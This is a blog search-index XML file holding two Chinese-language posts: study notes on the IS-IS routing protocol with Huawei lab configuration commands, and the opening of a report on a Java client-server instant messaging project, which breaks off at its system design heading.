<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>链路状态路由协议IS-IS</title>
      <link href="/2023/03/26/%E9%93%BE%E8%B7%AF%E7%8A%B6%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AEIS-IS/"/>
      <url>/2023/03/26/%E9%93%BE%E8%B7%AF%E7%8A%B6%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AEIS-IS/</url>
      
        <content type="html"><![CDATA[<center><h1>中间系统到中间系统 IS-IS</h1></center><p>[TOC]</p><blockquote><p><font color="blue">IS-IS是ISO为CLNP[<font color="black">ConnectionLessNetwork Protocol，无连接网络协议]</font>设计的一种动态路由协议</font></p></blockquote><p>随着TCP/IP协议的流行，为了提供对IP路由的支持，IETF在RFC1195中对IS-IS进行了扩充和修改，使它能够同时应用在TCP/IP和OSI环境中，我们将扩展后的IS-IS称为<strong>集成IS-IS</strong></p><h2 id="IS-IS的基本概念"><a href="#IS-IS的基本概念" class="headerlink" title="IS-IS的基本概念"></a>IS-IS的基本概念</h2><p>IS-IS概述：IS-IS是一种<font color="red">链路状态路由协议</font>，是ISO定义的OSI协议栈中的CLNS是ConnectionLess Network Service，无连接网络服务的一部分</p><ul><li><p>CLNS (CLNS也是一种无连接的网络) 由以下三个部分组成</p><ul><li><p>CLNP：类似于TCP/IP中的IP协议。</p></li><li><p>IS-IS：类似于TCP/IP中的OSPF</p></li><li><p>ES-IS：类似于TCP/IP中的ARP，ICMP等</p></li></ul></li><li><p>ES：End System，终端系统，类似于IP网络环境中的主机</p></li><li><p>ES-IS：End System to Intermediate System，终端系统到中间系统</p></li></ul><h3 id="IS-IS地址结构"><a href="#IS-IS地址结构" class="headerlink" title="IS-IS地址结构"></a>IS-IS地址结构</h3><h5 id="NSAP："><a href="#NSAP：" class="headerlink" title="NSAP："></a>NSAP：</h5><blockquote><p><font color="blue">NSAP Network Service Access Point，网络服务访问点</font>，是OSI协议栈中用于定位资源的地址，主要用于提供网络层和上层应用之间的接口</p></blockquote><ul><li>NSAP包括IDP（Initial Domian Part）及DSP（Domian Specific Part）如下图所示：</li></ul><img src="D:\blog\shierjinghuang\source\_posts\链路状态路由协议IS-IS\IS-IS地址结构.png" style="zoom:80%;" /><center>IS-IS地址结构</center><ul><li>IDP，由AFI(Authority and Format Identifier)与IDI(Initial Domain Identifier)两部分组成，AFI表示地址分配机构和地址格式，IDI用来标识域</li><li>DSP相当于IP地址中的子网号和主机地址。由High Order DSP、System ID和SEL三个部分组成，High Order DSP用来分割区域，System ID用来区分主机，SEL（NSAP Selector）用来指示服务类型</li></ul><h5 id="NET："><a href="#NET：" class="headerlink" title="NET："></a>NET：</h5><blockquote><p><font color="blue">NET 网络实体名称：是OSI协议栈中设备的网络层信息，主要用于路由计算</font>，由区域地址Area ID和System ID组成，可以看作是特殊的NSAP</p></blockquote><ul><li><p>NET的长度与NSAP的相同，最长为20Byte，最短为8Byte</p></li><li><p>在IP网络中运行IS-IS时，只需配置NET，根据NET地址设备可以获取到Area ID以及System ID。</p></li><li><p><font color="blue">Area ID被称为区域地址</font>，由IDP和DSP中的High Order DSP组成，能标识路由域，也标识路由域中的区域</p><ul><li>一般情况下，一个路由器只需要配置一个区域地址，且同一区域中所有节点的区域地址都要相同。为了支持区域的平滑合并、分割及转换，缺省情况下，一个IS-IS进程下最多可配置3个区域地址。</li></ul></li><li><p>System ID用来在区域内唯一标识主机或路由器。在设备的实现中，它的长度固定为6Byte。</p><ul><li>System ID通常由root ID扩展得到</li></ul></li></ul><h3 id="IS-IS拓扑结构"><a href="#IS-IS拓扑结构" class="headerlink" title="IS-IS拓扑结构"></a>IS-IS拓扑结构</h3><ul><li>IS-IS在自治系统内采用骨干区域与非骨干区域两级的分层结构：<ul><li>Level-1路由器部署在非骨干区域</li><li>Level-2路由器和Level-1-2路由器部署在骨干区域</li></ul></li><li>每一个非骨干区域都通过Level-1-2路由器与骨干区域相连</li></ul><p><strong>补充IS-IS与OSPF的区别：</strong></p><ul><li>在IS-IS中，每个路由器都只属于一个区域；而在OSPF中，一个路由器的不同接口可以属于不同的区域</li><li>在IS-IS中，单个区域没有骨干与非骨干区域的概念；而在OSPF中，Area0被定义为骨干区域</li><li>在IS-IS中，Level-1和Level-2级别的路由都采用SPF算法，分别生成最短路径树SPT；而在OSPF中，只有在同一个区域内才使用SPF算法，区域之间的路由需要通过骨干区域来转发</li></ul><h4 id="IS-IS路由器的分类"><a href="#IS-IS路由器的分类" class="headerlink" title="IS-IS路由器的分类"></a>IS-IS路由器的分类</h4><img src="D:\blog\shierjinghuang\source\_posts\链路状态路由协议IS-IS\IS-IS路由器分类示意图.png" style="zoom:80%;" /><h5 id="Level-1路由器"><a href="#Level-1路由器" class="headerlink" title="Level-1路由器"></a>Level-1路由器</h5><p>Level-1路由器是一种<font color="red">IS-IS区域内部路由器</font>，它<font color="blue">只与属于同一区域的Level-1和Level-1-2路由器形成邻接关系，这种邻接关系称为Level-1邻接关系</font></p><ul><li><p>Level-1路由器无法与Level-2路由器建立邻接关系</p></li><li><p>Level-1路由器只负责维护Level-1的链路状态数据库LSDB，该LSDB只包含本区域的路由信息</p></li><li><p>Level-1路由器必须通过Level-1-2路由器接入IS-IS骨干区域从而访问其他区域。</p></li></ul><p><strong>Level-1-2路由器</strong></p><p>同时属于Level-1和Level-2的路由器称为Level-1-2路由器，它可以与同一区域的Level-1和Level-1-2路由器形成Level-1邻接关系，也可以与其他区域的Level-2和Level-1-2路由器形成Level-2的邻接关系</p><ul><li><font color="orange">Level-1-2路由器也是IS-IS骨干网络的组成部分</font></li><li>Level-1-2路由器维护两个LSDB，Level-1的LSDB用于区域内路由，Level-2的LSDB用于区域间路由</li></ul><p><strong>Level-2路由器</strong><br><font color="red">Level-2路由器，是IS-IS骨干路由器</font>，可以与同一或者不同区域的Level-2路由器或者Level-1-2路由器形成邻接关系</p><ul><li>Level-2路由器维护一个Level-2的LSDB，该LSDB包含整个IS-IS域的所有路由信息</li><li>所有形成Level-2邻接关系的路由器组成路由域的骨干网，负责在不同区域间通信</li><li>路由域中Level-2级别的路由器必须是物理连续的，以保证骨干网的连续性</li></ul><p><strong>IS-IS支持的网络类型：</strong><font color="orange">IS-IS会自动根据接口的数据链路层封装决定该接口的缺省网络类型</font> ， IS-IS支持两种类型的网络，广播Broadcast和点到点P2P网络如PPP、 HDLC等</p><h4 id="IS-IS开销值"><a href="#IS-IS开销值" class="headerlink" title="IS-IS开销值"></a>IS-IS开销值</h4><p>IS-IS使用Cost（开销）作为路由度量值，<font color="red">Cost值越小，则路径越优</font></p><ul><li>IS-IS链路的Cost与设备的接口有关，每一个激活了IS-IS的接口都会维护接口Cost</li><li><font color="blue">IS-IS接口的Cost在缺省情况下并不与接口带宽相关</font>，无论接口带宽多大，<font color="blue">缺省时Cost为10</font></li></ul><p><font color="FF6600">一条IS-IS路径的Cost等于本路由器到达目标网段沿途的<strong>所有链路的Cost总和</strong></font></p><ul><li>IS-IS有三种方式来确定接口的开销，按照优先级由高到低分别是：<ul><li>接口开销：为单个接口设置开销</li><li>全局开销：为所有接口设置开销</li><li>自动计算开销：根据接口带宽自动计算开销</li></ul></li></ul><blockquote><p>在早期的ISO10589中，使能IS-IS的接口下最大只能配置值为63的开销值，此时IS-IS的开销类型为narrow</p></blockquote><blockquote><p>RFC3784中规定，使能IS-IS的接口开销值可以扩展到16777215，此时IS-IS的开销类型为wide</p></blockquote><ul><li>缺省时，华为路由器采用的开销类型是narrow</li><li>narrow类型下使用的TLV：<ul><li>128号TLV（IP Internal Reachability TLV）：用来携带路由域内的IS-IS路由信息</li><li>130号TLV（IP External Reachability TLV）：用来携带路由域外的IS-IS路由信息</li><li>2号TLV(IS Neighbors TLV)：用来携带邻居信息。</li></ul></li><li>wide类型下使用的TLV：<ul><li>135号TLV(Extended IP Reachability TLV)：用来替换原有的IP reachability TLV，携带IS-IS路由信息，它扩展了路由开销值的范围，并可以携带sub TLV</li><li>22号TLV（IS Extended Neighbors TLV）：用来携带邻居信息</li></ul></li></ul><h3 id="IS-IS报文类型"><a href="#IS-IS报文类型" class="headerlink" title="IS-IS报文类型"></a>IS-IS报文类型</h3><p><font color="blue">IS-IS报文是直接封装在数据链路层的帧结构中的</font></p><ul><li>PDU，协议数据单元可以分为两个部分，报文头 IS-IS Header和变长字段部分 Variable Length Fields</li><li>IS-IS Header又可分为通用头部 PDU Common Header和专用头部 PDU Specific Header<ul><li>对于所有PDU来说，通用报头都是相同的，但专用报头根据PDU类型不同而有所差别</li></ul></li></ul><img src="D:\blog\shierjinghuang\source\_posts\链路状态路由协议IS-IS\IS-IS报文类型.png" style="zoom:67%;" /><h4 id="IS-IS通用字段详解："><a href="#IS-IS通用字段详解：" class="headerlink" title="IS-IS通用字段详解："></a>IS-IS通用字段详解：</h4><p><strong>重要字段解释：</strong></p><img src="D:\blog\shierjinghuang\source\_posts\链路状态路由协议IS-IS\IS-IS通用首部.png" style="zoom: 80%;" /><ul><li>Intradomain Routing Protocol Discriminator：域内路由选择协议鉴别符，固定为0x83</li><li>Length Indicator：IS-IS头部的长度（包括通用头部和专用头部），以Byte为单位</li><li>Version/Protocol ID Extension：版本/协议标识扩展，固定为0x01</li><li>System ID Length：NSAP地址或NET中System ID区域的长度。值为0时，表示System ID区域的长度为6Byte</li><li>R（Reserved）：保留，固定为0</li><li>Version：固定为0x01</li><li>Max.Areas：支持的最大区域个数。设置为1～254的整数，表示该IS-IS进程实际所允许的最大区域地址数；设置为0，表示该IS-IS进程最大只支持3个区域地址数</li></ul><h4 id="IS-IS报文类型概述"><a href="#IS-IS报文类型概述" class="headerlink" title="IS-IS报文类型概述"></a>IS-IS报文类型概述</h4><blockquote><p><font color="fasa">IS-IS的PDU有4种类型：IIH，LSP 链路状态报文，CSNP 全序列号报文，PSNP 部分序列号报文</font></p></blockquote><p><strong>IIH IS-IS Hello报文：用于建立和维持邻接关系</strong></p><ul><li>广播网络中的Level-1 IS-IS路由器使用Level-1 LAN IIH，广播网络中的Level-2 IS-IS路由器使用Level-2 LAN IIH</li><li>点到点网络中则使用P2P IIH</li></ul><p><strong>LSP 链路状态报文：用于交换链路状态信息</strong></p><ul><li>LSP分为两种，Level-1 LSP、Level-2 LSP</li></ul><p><strong>SNP 序列号报文：通过描述全部或部分链路数据库中的LSP来同步各LSDB，从而维护LSDB的完整与同步</strong></p><ul><li>SNP包括CSNP 全序列号报文和PSNP 部分序列号报文，进一步又可分为Level-1 CSNP、 Level-2 CSNP、 Level-1 PSNP和Level-2 PSNP。</li></ul><h4 id="IS-IS常见的TLV"><a href="#IS-IS常见的TLV" class="headerlink" title="IS-IS常见的TLV"></a>IS-IS常见的TLV</h4><p>IS-IS报文首部有一个TLV字段，TLV的含义是：类型（TYPE），长度（LENGTH），值（VALUE）。该字段实际上是一个数据结构，这个结构包含了这三部分</p><blockquote><p>使用TLV结构构建报文的好处是<font color="blue">灵活性和扩展性好</font>。采用TLV使得报文的整体结构固定，增加新特性只需要增加新TLV即可，不需要改变整个报文的整体结构。</p></blockquote><table><thead><tr><th>TLV Type</th><th>名称</th><th>PDU类型</th></tr></thead><tbody><tr><td>1</td><td>Area Addresses                                                  区域地址</td><td>IIH、LSP</td></tr><tr><td>2</td><td>IS Neighbors（LSP）                                         中间系统邻接</td><td>LSP</td></tr><tr><td>4</td><td>Partition Designated Level2 IS                         区域分段指定L2中间系统</td><td>L2、LSP</td></tr><tr><td>6</td><td>IS Neighbors（MAC Address）                        中间系统邻接</td><td>LAN、IIH</td></tr><tr><td>7</td><td>IS Neighbors（SNPA Address）                       中间系统邻接</td><td>LAN、IIH</td></tr><tr><td>8</td><td>Padding                                                                填充</td><td>IIH</td></tr><tr><td>9</td><td>LSP Entries                                                           LSP条目</td><td>SNP</td></tr><tr><td>10</td><td>Authentication Information                              验证信息</td><td>IIH、LSP、SNP</td></tr><tr><td>128</td><td>IP Internal Reachability Information               IP内部可达性信息</td><td>LSP</td></tr><tr><td>129</td><td>Protocols Supported                                          支持的协议</td><td>IIH、LSP</td></tr><tr><td>130</td><td>IP External Reachability Information              IP外部可达性信息</td><td>LSP</td></tr><tr><td>131</td><td>Inter-Domain Routing Protocol Information 域间路由选择协议信息</td><td>L2、 LSP</td></tr><tr><td>132</td><td>IP Interface Address                                          IP接口地址</td><td>IIH 、LSP</td></tr></tbody></table><h2 id="IS-IS工作原理"><a href="#IS-IS工作原理" class="headerlink" title="IS-IS工作原理"></a>IS-IS工作原理</h2><h3 id="IS-IS邻接关系建立原则"><a href="#IS-IS邻接关系建立原则" class="headerlink" title="IS-IS邻接关系建立原则"></a>IS-IS邻接关系建立原则</h3><ul><li><p>IS-IS按如下原则建立邻接关系：</p><ul><li>只有同一层次的相邻路由器才有可能成为邻接</li><li>对于Level-1路由器来说，Area ID必须一致</li><li>链路两端IS-IS接口的网络类型必须一致</li><li>链路两端IS-IS接口的地址必须处于同一网段</li></ul></li><li><p>IS-IS是直接运行在数据链路层上的协议，并且最早设计是给CLNP使用的，IS-IS邻接关系的形成与IP地址无关</p></li><li><p>在实际的部署中，在IP网络上运行IS-IS时，需要检查对方的IP地址的。如果接口配置了从IP，那么只要双方有某个IP在同一网段，就能建立邻接，不一定要主IP相同。</p></li></ul><h5 id="在以太网中的额外原则："><a href="#在以太网中的额外原则：" class="headerlink" title="在以太网中的额外原则："></a>在以太网中的额外原则：</h5><ul><li>通过将以太网接口模拟成点到点接口，可以建立点到点链路邻接关系</li><li>当链路两端IS-IS接口的地址不在同一网段时，如果配置接口对接收的Hello报文不作IP地址检查，也可以建立邻接关系<ul><li>对于点到点接口，可以配置接口忽略IP地址检查</li><li>对于以太网接口，需要将以太网接口模拟成点到点接口，然后才可以配置接口忽略IP地址检查</li></ul></li><li>一般情况下，一个接口只需配置一个主IP地址，但在有些特殊情况下需要配置从IP地址</li></ul><h5 id="IIH报文"><a href="#IIH报文" class="headerlink" title="IIH报文"></a>IIH报文</h5><p>IIH报文用于建立和维持邻接关系，广播网络中的Level-1 IS-IS路由器使用Level-1 LAN IIH；广播网络中的Level-2 IS-IS路由器使用Level-2 LAN IIH；点到点网络中则使用P2P IIH</p><ul><li>Reserved/Circuit Type：表示路由器的类型 01表示L1，10表示L2，11表示L1/L2</li><li>Source ID  ：发出Hello报文的路由器的System ID</li><li>Holding Time ： 保持时间。在此时间内如果没有收到邻接发来的Hello报文，则中止已建立的邻接关系</li><li>Priority ：选举DIS的优先级，取值范围为0～127。数值越大，优先级越高。该字段只在广播网中的Hello消息(LAN IIH消息)携带；点到点网络的Hello消息(P2P IIH消息)没有此字段，也没有此字段之前的R保留位</li><li>LAN ID： 包括DIS的System ID和伪节点ID。该字段只在广播网中的Hello消息(LAN IIH消息)携带；点到点网络的Hello消息(P2P IIH消息)没有此字段</li><li>Local Circuit ID：本地链路ID，该字段只在点到点网络的Hello消息(P2P IIH消息)携带；广播网中的Hello消息(LAN IIH消息)没有此字段。 </li></ul><h4 id="广播网络中的邻接关系建立过程"><a href="#广播网络中的邻接关系建立过程" class="headerlink" title="广播网络中的邻接关系建立过程"></a>广播网络中的邻接关系建立过程</h4><p>两台运行IS-IS的路由器在交互协议报文实现路由功能之前必须首先建立邻接关系。在不同类型的网络上，IS-IS的邻接建立方式并不相同。在广播网络中，使用三次握手建立邻接关系</p><ol><li>在Down状态下，R1组播发送Level-1 LAN IIH，此报文中邻接列表为空</li><li>R2收到此报文后，将邻接状态标识为Initial。R2再向R1回复Level-1 LAN IIH，此报文中标识R1为R2的邻接</li><li>R1收到此报文后，将自己与R2的邻接状态标识为Up。再向R2发送一个标识R2为R1邻接的Level-1 LAN IIH</li><li>R2收到此报文后，将自己与R1的邻接状态标识为Up。这样，两个路由器成功建立了邻接关系</li><li>广播网络中需要选举DIS，在邻接关系建立后，路由器会等待两个Hello报文间隔，再进行DIS的选举。</li></ol><h5 id="DIS与伪节点"><a href="#DIS与伪节点" class="headerlink" title="DIS与伪节点"></a>DIS与伪节点</h5><p>在广播网络中，IS-IS需要在所有的路由器中选举一个路由器作为DIS (指定中间系统) </p><ul><li>DIS用来创建和更新伪节点（Pseudonodes），并负责生成伪节点的LSP，用来描述网络上有哪些网络设备</li><li>伪节点是用来模拟广播网络的一个虚拟节点，并非真实的路由器。在IS-IS中，伪节点用DIS的System ID和Circuit ID（非0值）标识</li></ul><img src="D:\blog\shierjinghuang\source\_posts\链路状态路由协议IS-IS\IS-IS DIS与伪结点.png" style="zoom: 67%;" /><h4 id="点到点网络中的邻接关系建立过程"><a href="#点到点网络中的邻接关系建立过程" class="headerlink" title="点到点网络中的邻接关系建立过程"></a>点到点网络中的邻接关系建立过程</h4><p>点到点网络中，邻接关系的建立使用两次握手方式：只要路由器收到对端发来的Hello报文，就单方面宣布邻接为Up状态，建立邻接关系<br>两次握手机制存在明显的缺陷，华为设备在点到点网络中使用IS-IS时，默认使用三次握手建立邻接关系。此方式通过三次发送P2P IIH最终建立起邻接关系</p><h3 id="链路状态数据库同步"><a href="#链路状态数据库同步" class="headerlink" title="链路状态数据库同步"></a>链路状态数据库同步</h3><p>Level-1路由器的路由计算</p><p>R1是Level-1路由器，只维护Level-1 LSDB，该LSDB中包含同属一个区域的R2及R3以及R1自己产生的Level-1 LSP。<br>R1根据LSDB中的Level-1 LSP计算出Area 49.0001内的拓扑，以及到达区域内各个网段的路由信息。<br>R2及R3作为Area 49.0001内的Level-1-2路由器，会在它们向该区域下发的Level-1 LSP中设置ATT标志位，用于向区域内的Level-1路由器宣布可以通过自己到达其他区域。 R1作为Level-1路由器，会根据该ATT标志位，计算出指向R2或R3的默认路由。</p><p>Level-1路由器的次优路径的问题</p><p>缺省时， R1只能通过指向R2或R3的默认路由到达区域外部，但是R1距离R2和R3路由器的Cost值相等，那么当R1发送数据包到192.168.20.0/24时，就有可能选择路径2，导致出现次优路径。</p><p>路由渗透</p><p>缺省情况下，Level-1-2路由器不会将到达其他区域的路由通告本Level-1区域中。<br>通过路由渗透，可以将区域间路由通过Leve-1-2路由器传递到Level-1区域，此时Leve-1路由器可以学习到其他区域的详细路由，从而计算出最优路径。</p><p>Level-1-2路由器的路由计算</p><p>R2及R3都维护Level-1 LSDB，它们能够通过这些LSDB中的LSP计算出Area 49.0001的路由。<br>R2及R3都维护Level-2 LSDB，它们能够通过这些LSDB中的LSP计算出Area 49.0002的路由。<br>R2及R3将到达Area 49.0001的路由以Level-2 LSP的形式发送到Area 49.0002。</p><p>Level-2路由器的路由计算</p><p>R4及R5作为Level-2路由器，只会维护Level-2 LSDB，它们能够根据该LSDB计算出到达全网各个网段的路由。</p><h2 id="IS-IS的基本配置"><a href="#IS-IS的基本配置" class="headerlink" title="IS-IS的基本配置"></a>IS-IS的基本配置</h2><h3 id="IS-IS协议的基本配置"><a href="#IS-IS协议的基本配置" class="headerlink" title="IS-IS协议的基本配置"></a>IS-IS协议的基本配置</h3><p>1 . 创建IS-IS进程，进入IS-IS进程</p><pre class="line-numbers language-none"><code class="language-none">isis [process-id] <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数process-id用来指定一个IS-IS进程,如果不指定参数process-id，则系统默认的进程为1</p><p>2 . 配置网络实体名称</p><pre class="line-numbers language-none"><code class="language-none">network-entity net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通常情况下，一个IS-IS进程下配置一个NET即可。当区域需要重新划分时，例如将多个区域合并，或者将一个区域划分为多个区域，这种情况下配置多个NET可以在重新配置时仍然能够保证路由的正确性。由于一个IS-IS进程中区域地址最多可配置3个，所以NET最多也只能配3个。在配置多个NET时，必须保证它们的System ID都相同</p><p>3 . 配置全局Level级别</p><pre class="line-numbers language-none"><code class="language-none">is-level &#123; level-1 | level-1-2 | level-2 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>缺省情况下，设备的Level级别为level-1-2。</p><ul><li>在网络运行过程中，改变IS-IS设备的级别可能会导致IS-IS进程重启并可能会造成IS-IS邻居断连，建议用户在配置IS-IS时即完成设备级别的配置。 </li></ul><p>4 . 在接口上使能IS-IS协议</p><pre class="line-numbers language-none"><code class="language-none">isis enable [ process-id ]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在接口视图下配置该命令后，IS-IS将通过该接口建立邻居、扩散LSP报文。</p><p>5 .  配置接口Level级别</p><pre class="line-numbers language-none"><code class="language-none">isis circuit-level [ level-1 | level-1-2 | level-2 ]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>缺省情况下，接口的Level级别为level-1-2。<br>两台Level-1-2设备建立邻居关系时，缺省情况下，会分别建立Level-1和Level-2邻居关系。如果只希望建立Level-1或者Level-2的邻居关系，可以通过修改接口的Level级别实现。</p><p>6 .  修改接口的DIS优先级</p><pre class="line-numbers language-none"><code class="language-none">isis dis-priority priority [level-1 | level-2]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>缺省情况下，IS-IS接口DIS优先级为64，该命令用来指定挑选对应层次DIS（Designated Intermediate System）时接口的优先级</p><h3 id="IS-IS配置实验："><a href="#IS-IS配置实验：" class="headerlink" title="IS-IS配置实验："></a>IS-IS配置实验：</h3><img src="D:\blog\shierjinghuang\source\_posts\链路状态路由协议IS-IS\IS-IS配置实验拓扑.png" /><h4 id="配置接口IP"><a href="#配置接口IP" class="headerlink" title="配置接口IP"></a>配置接口IP</h4><h4 id="配置IS-IS基本功能"><a href="#配置IS-IS基本功能" class="headerlink" title="配置IS-IS基本功能"></a>配置IS-IS基本功能</h4><h5 id="配置R1"><a href="#配置R1" class="headerlink" title="# 配置R1"></a># 配置R1</h5><pre class="line-numbers language-华为" data-language="华为"><code class="language-华为">[R1] isis 1[R1-isis-1] is-level level-1[R1-isis-1] network-entity 10.0000.0000.0001.00[R1-isis-1] quit[R1] interface gigabitethernet 0&#x2F;0&#x2F;0[R1-GigabitEthernet0&#x2F;0&#x2F;0] isis enable 1[R1-GigabitEthernet0&#x2F;0&#x2F;0] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="配置R3"><a href="#配置R3" class="headerlink" title="# 配置R3"></a># 配置R3</h5><pre class="line-numbers language-华为" data-language="华为"><code class="language-华为">[R3] isis 1[R3-isis-1] is-level level-1[R3-isis-1] network-entity 10.0000.0000.0003.00[R3-isis-1] quit[R3] interface gigabitethernet 0&#x2F;0&#x2F;0[R3-GigabitEthernet0&#x2F;0&#x2F;0] isis enable 1[R3-GigabitEthernet0&#x2F;0&#x2F;0] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="配置R2"><a href="#配置R2" class="headerlink" title="# 配置R2"></a># 配置R2</h5><pre class="line-numbers language-华为" data-language="华为"><code class="language-华为">[R2] isis 1[R2-isis-1] network-entity 10.0000.0000.0002.00[R2-isis-1] quit[R2] interface gigabitethernet 0&#x2F;0&#x2F;0[R2-GigabitEthernet0&#x2F;0&#x2F;0] isis enable 1[R2-GigabitEthernet0&#x2F;0&#x2F;0] quit[R2] interface gigabitethernet 0&#x2F;0&#x2F;1[R2-GigabitEthernet0&#x2F;0&#x2F;1] isis enable 1[R2-GigabitEthernet0&#x2F;0&#x2F;2] quit[R2] interface gigabitethernet 3&#x2F;0&#x2F;0[R2-GigabitEthernet0&#x2F;0&#x2F;2] isis enable 1[R2-GigabitEthernet0&#x2F;0&#x2F;2] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="配置R4"><a href="#配置R4" class="headerlink" title="# 配置R4"></a># 配置R4</h5><pre class="line-numbers language-华为" data-language="华为"><code class="language-华为">[R4] isis 1[R4-isis-1] is-level level-2[R4-isis-1] network-entity 20.0000.0000.0004.00[R4-isis-1] quit[R4] interface gigabitethernet0&#x2F;0&#x2F;0[R4-GigabitEthernet0&#x2F;0&#x2F;0] isis enable 1[R4-GigabitEthernet0&#x2F;0&#x2F;0] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java实训项目 即时通讯系统</title>
      <link href="/2023/03/18/Java%E5%AE%9E%E8%AE%AD/"/>
      <url>/2023/03/18/Java%E5%AE%9E%E8%AE%AD/</url>
      
        <content type="html"><![CDATA[<h2 id="即时通讯系统"><a href="#即时通讯系统" class="headerlink" title="即时通讯系统"></a>即时通讯系统</h2><h3 id="1-系统概述"><a href="#1-系统概述" class="headerlink" title="1  系统概述"></a>1  系统概述</h3><blockquote><p><font color=blue>即时通讯是一款基于互联网的即时通讯软件，旨在为企业提供高效、安全、便捷的沟通工具。</font></p><p>本项目是一个基于Java语言开发的企业QQ系统，是基于C/S模型实现。系统可分为两个部分，服务端和客户端。服务端的工作主要是来监听和接收来自客户端的请求，然后存储并处理客户端发来的消息，并通知客户端。而客户端的功能是能够让新用户注册，通过用户名密码登陆并且使用该系统。通过服务端和客户端的协同工作最终使用户能够使用该程序，完成用户和用户之间的沟通。</p></blockquote><h4 id="1-1-功能概述"><a href="#1-1-功能概述" class="headerlink" title="1.1 功能概述"></a>1.1 功能概述</h4><ol><li><p>好友管理：支持用户进行好友添加、好友删除、修改等操作，同时也支持用户自行注册、登录、修改个人信息等操作</p></li><li><p>群组管理：支持用户创建、删除、修改群组，同时也支持用户加入、退出、查看群组等操作</p></li><li><p>即时通讯：支持用户之间的即时聊天，同时也支持群组内的多人聊天，聊天内容可以包括文字、图片、文件、表情等</p></li><li><p>安全性保障：所有数据传输均采用加密方式，保证用户信息和聊天内容的安全性</p></li><li><p>消息推送：支持消息推送功能，当有新消息到达时，系统会及时向用户发送通知，方便用户及时查看聊天记录</p></li><li><p>日志记录：系统会记录用户的聊天记录以及操作日志，方便管理员进行管理和监控</p></li></ol><h4 id="1-2-技术概述"><a href="#1-2-技术概述" class="headerlink" title="1.2 技术概述"></a>1.2 技术概述</h4><p><strong>1.2.1 Java基础知识：包括语法、面向对象编程</strong></p><p>Java具有简单性、面向对象、分布式、健壮性、安全性、平台独立与可移植性、多线程、多线程、动态性等特点。Java可以编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统应用程序等</p><p><strong>1.2.2 网络编程技术Socket</strong></p><p>在本程序中为实现客户端和服务器之间的通信，使用Socket技术，socket能够通过java程序发出请求和处理网络发过来的请求。在建立双方网络连接的时候会使用到socket套接字。当网络成功建立连接后，双方都会有一个socket的实例被建立，通过使用和操作这个实例完成各种需求。对双方的连接来说，客户端和服务端并没有什·么差别socket是平等的，它们都是通过socket的实现类和它的子类来完成的</p><p>socket分为服务端和客户端两部分，服务端主要是可以监听一个特殊的端口，它能够监听并且捕获的向这个特定的端口发出的请求，这个请求就是由客户端来发起的。当连接建立之后会产生会话，完成会话之后关闭连接。而客户端主要是发起请求，它能够向某一个特定的服务器上的一个特殊的端口发起请求，然后建立连接处理会话，会话完成后和服务端一样关闭socket。客户端并不用像服务器一样规定一个特殊的打开的端口，系统会自动分配一个能够使用的端口</p><p><strong>1.2.3 数据库java.SQL与MySQL数据库</strong></p><p>Java.SQL是Java语言中用于访问关系型数据库的API，Java.SQL API提供了一组简单易用的接口和类来访问关系型数据库，使得开发者可以方便地进行数据库操作，Java.SQL API是面向对象的，它将数据库中的数据结构映射为Java中的对象，使得开发者可以使用面向对象的方式来操作数据库，Java.SQL API支持插件式的驱动程序架构，使得开发者可以通过添加新的驱动程序来支持更多的数据库类型</p><p>MySQL是一种开源的、关系型数据库管理系统（RDBMS），它是由瑞典MySQL AB公司开发的，现在属于Oracle公司旗下产品。MySQL广泛应用于Web应用程序的开发中，是目前使用最为广泛的关系型数据库之一。其具有高性能，可扩展性、简单易用、跨平台性、可靠性，被广泛应用于各种应用程序的开发中</p><p><strong>1.2.4 前端技术java.swing与java.awt</strong></p><p>Java Swing是一组用于创建图形用户界面（GUI）的Java类库。它提供了丰富的组件和工具，可以帮助开发人员构建跨平台的GUI应用程序。ava Swing提供了许多常用的GUI组件，例如按钮、文本框、下拉列表、表格等，还提供了一些高级组件，例如树形控件、分隔面板、标签页等。Java Swing提供了多种布局管理器，例如BorderLayout、FlowLayout、GridLayout等，可以帮助开发人员快速构建复杂的GUI界面</p><p><strong>1.2.5 系统及文件流操作java.io</strong></p><p>Java的核心库java.io提供了全面的IO接口。包括：文件读写、标准设备输出等。Java中IO是以流为基础进行输入输出的，所有数据被串行化写入输出流，或者从输入流读入。支持文件输入输出、网络输入输出、内存输入输出等多种方式，可以处理各种来源的数据</p><p><strong>1.2.6 各类型数据处理java.util</strong></p><p>Java.util是Java语言中一个重要的标准库，提供了许多常用的工具类和数据结构，用于处理各种数据类型、日期、时间、集合等问题。Java.util提供了众多的数据结构，如数组、列表、队列、栈、堆、哈希表、树、图等，可以满足不同场景下的数据存储和处理需求。此外提供了Date、Calendar、DateFormat、SimpleDateFormat等类，支持日期和时间的格式化、解析、计算和比较等操作</p><p><strong>1.2.7 java.long多线程设置</strong></p><p>java.lang包中的Thread类是Java实现多线程的核心类之一。通过创建Thread对象并调用其start()方法，可以启动一个新的线程并执行其中的代码</p><p>创建了一个新的线程后，会将其作为参数传递给Thread构造函数的Runnable对象中定义的代码块作为该线程的执行内容。调用start()方法后，该线程会在后台运行并执行其中的代码。除了Thread类，java.lang包中还提供了一些其他的类和接口，如Runnable接口、ThreadGroup类等，用于实现多线程编程。通过这些类和接口，可以方便地管理和控制多个线程的执行</p><h3 id="2-系统设计"><a href="#2-系统设计" class="headerlink" title="2  系统设计"></a>2  